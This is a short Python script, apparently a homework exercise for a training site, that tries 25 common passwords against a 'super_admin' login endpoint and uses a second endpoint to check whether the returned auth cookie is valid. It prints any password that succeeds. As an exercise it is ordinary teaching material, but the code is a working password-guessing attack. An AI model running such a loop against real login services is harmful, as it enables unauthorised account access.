import requests
import time

passwords = ("123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe")
for i in passwords:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": i})
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        if "NOT" in response2.text:
            pass
        else:
            print(response2.text)
            print("Password: " + i)